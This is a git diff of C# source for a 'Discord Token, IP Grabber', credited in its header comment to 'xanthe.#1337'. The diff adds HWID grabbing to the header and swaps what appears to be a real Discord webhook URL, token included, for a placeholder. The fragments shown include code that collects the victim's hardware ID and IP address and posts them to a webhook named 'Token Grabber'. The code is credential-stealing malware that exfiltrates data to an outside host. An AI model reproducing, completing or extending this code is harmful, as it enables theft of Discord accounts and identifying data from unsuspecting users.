@@ -6,7 +6,7 @@ using System.Collections.Generic;
 
 namespace DiscordTokenGrabber
 {
-    /*  | Discord Token, IP Grabber                   |
+    /*  | Discord Token, IP Grabber, Hwid Grabber     |
      *  | Coded by xanthe.#1337                       | 
      *  | [C#, Python, and Web developer (HTML, CSS)] |
      *  | ------------------------------------------- |
@@ -55,7 +55,7 @@ namespace DiscordTokenGrabber
             {
                 string Hwid = GetHWID();
                 string IP = GetIPAddress();
-                string Webhook = "https://discordapp.com/api/webhooks/681958257518182482/j3ycz7xeG8YPvqGjBnbYZuup1NlSW9h7nDW1aB5Y0weNNKxmbxPkkjNa_frmDZNI_EZQ";
+                string Webhook = "Full-Webhook-Link-Here";
                 string Webhook_Avatar = "https://steamuserimages-a.akamaihd.net/ugc/961973556167374789/672A76928C54C3E57E081E0EB9E9A752B18B1778/";
                 string Webhook_Name = "Token Grabber";
 
@@ -79,5 +79,4 @@ namespace DiscordTokenGrabber
             Console.ReadKey();
         }
     }
-
 }
